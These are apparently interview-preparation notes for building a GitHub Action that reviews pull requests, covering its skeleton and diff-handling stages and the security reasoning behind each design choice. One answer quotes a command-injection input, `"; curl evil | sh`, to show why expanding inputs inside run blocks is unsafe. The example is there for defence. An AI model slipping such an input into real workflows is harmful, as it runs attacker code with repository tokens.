# Interview notes

One section per build stage. Each has five likely questions, a failure I have
actually reasoned through, and the commit that introduced it.

## Stage 1 - Skeleton

### Five questions

**1. Why a composite action instead of a JavaScript or Docker action?**
Composite is just YAML steps, so there is no build step or image to publish and
anyone can read exactly what runs. Docker actions are slower (image pull) and
Linux-only; JS actions need a committed, bundled `dist/`. The cost: composite
steps get no automatic `INPUT_*` variables and no `permissions:` block of their
own, so I map inputs to env vars explicitly and the *caller's* workflow sets
permissions.

**2. Why pass inputs through `env:` instead of writing `${{ inputs.x }}` in `run:`?**
`${{ }}` is expanded by the runner *before* bash sees the script, so a crafted
input like `"; curl evil | sh` becomes part of the code. Via `env:` the value
stays data in an environment variable. A test fails if `${{` appears in a
`run:` block.

**3. Why pin Actions to a full commit SHA?**
Tags and branches are mutable: if an upstream maintainer account is
compromised, `@v4` can be repointed at malicious code that runs with your
token. A SHA is content-addressed. I keep the tag in a trailing comment for
humans, and a test enforces SHA pins for every `uses:`.

**4. Why does a missing API key mean "rules-only" instead of an error?**
The AI layer is optional, and fork PRs never receive secrets, so "no key" is a
normal state, not a misconfiguration. Failing would make the Action unusable on
every fork PR. Rules-only is also the safe fallback for cost and data privacy.

**5. Why `contents: read` + `pull-requests: write` only?**
Least privilege: if the Action or a dependency is compromised, the token can
read code and write PR reviews, but cannot push, alter workflows, or touch
releases. A repo test fails if a workflow asks for more.

### One common failure and how I'd debug it

**Symptom:** the step fails with `::error title=Invalid pr-guardian input::...`
and exit code 2.
**Debug:** exit 2 is reserved for *configuration* errors (findings will use a
different code), so it is never a bug in the PR under review. Read the
annotation: all problems are listed at once. Typical causes: `fail-on: High `
with a typo, `dry-run: yes` (must be `true`/`false`), or `max-files: 0`. Check
the `with:` block of the calling workflow. If the message is empty, run locally:
`PRG_GITHUB_TOKEN=x PYTHONPATH=src python -m pr_guardian`.

### Decisions worth remembering

- **Default model is `claude-sonnet-5-5`**, not Haiku 4.5: Anthropic's models
  page (checked 2026-10-03) lists Haiku 4.5 retiring no sooner than 2026-10-15.
- **Zero runtime dependencies** so far: nothing to `pip install` at action run
  time, so a smaller supply-chain surface. PyYAML arrives in Stage 3 (pinned).
- **Exit codes:** 0 ok, 2 config error; 1 (findings fail the check) is added in Stage 4.

### Suggested commit

```
feat: project skeleton with composite action, config validation and CI

Add the composite action (inputs mapped to env vars), a validated frozen
Config, ruff/pytest/pre-commit tooling with pinned versions and SHA-pinned
Actions, repo-policy tests (SHA pins, no pull_request_target, minimal
permissions) and CI including an action smoke test.
```

---

## Stage 2 - Diff handling

### Five questions

**1. Why can't I just comment on any line number I like?**
GitHub's review API only accepts comments on lines that appear in the diff
(changed lines plus a few lines of context). Anything else makes the request
fail - and a review is submitted as one request, so one bad comment can lose
the whole review. So every finding is mapped through a parsed patch first, and
a finding with no valid target is dropped, never guessed.

**2. `line`/`side` versus `position` - what's the difference?**
`position` counts lines down from the first `@@` and keeps counting across
hunks (including later `@@` headers), so it is easy to get wrong. `line` +
`side: RIGHT` is just "line N of the new file". I compute both and plan to post
with `line`/`side`; `position` is a cross-check. Removed lines have no line in
the new file, so they cannot be targeted on the RIGHT side.

**3. Why does the parser raise on a malformed hunk instead of doing its best?**
Failing closed. A wrong line mapping posts a comment on the wrong code, which
misleads people. Skipping the file *and listing it as skipped* is honest. A bug
I actually hit: counting the final empty string from a trailing newline as a
blank context line let a truncated hunk look complete. There is now a test.

**4. How do you stop one huge PR from blowing up the run?**
Layered caps: `max-files`, a per-file patch size limit, and a total size limit.
The cheap filters (deleted files, unsupported types, `paths`) run first so that
400 README edits can't use up the budget meant for Terraform. Every cap that
drops a supported file puts it in a visible skipped list - silent truncation
makes green look like "everything was checked".

**5. Why does the HTTP client refuse redirects, and why not use `requests`?**
Python's urllib forwards the `Authorization` header when following a redirect,
even to another host. For a client that holds a write token, "refuse and report"
is safer than "follow". Using only the standard library also means zero
runtime dependencies to pin, audit or install. The client also never follows
`Link` pagination URLs from the response; it builds each URL itself, so the
token can only go to the configured API host.

### One common failure and how I'd debug it

**Symptom:** `::error title=GitHub API error::GitHub denied access: the token
needs at least 'pull-requests: read'` (exit 3), or a 404 on a PR that clearly
exists.
**Debug:** exit 3 means GitHub, not the PR, is the problem. A 403/404 on a
private repo almost always means the workflow's `permissions:` block omits
`pull-requests` (listing any permission removes all unlisted ones). Add
`pull-requests: write`. On a fork PR the token is read-only by design - reading
works, so a 403 there points at something else. Check the "Set up job" log
section for the "GITHUB_TOKEN Permissions" listing.

### Decisions worth remembering

- **Refuse `pull_request_target`** in code, not just in docs - the rule is
  enforced where a misconfiguration would actually happen.
- **Hostile file names**: git allows newlines and backticks in names. They are
  sanitised before reaching the log, and later the Markdown summary.
- **Not yet verified against the live API**: tests use a fake GitHub. The first
  real run is the CI `action-smoke` job on a PR. `X-GitHub-Api-Version:
  2022-11-28` is the documented stable value; I could not re-check the newest
  value from this sandbox.

### Suggested commit

```
feat: fetch PR files and map findings to valid diff lines

Add a stdlib-only GitHub client (pagination, retries, no redirects), a
fail-closed unified-diff parser producing line and position maps, path-based
file classification, selection with max-files and size caps and a visible
skipped report, and PR context detection that refuses pull_request_target and
flags fork PRs.
```
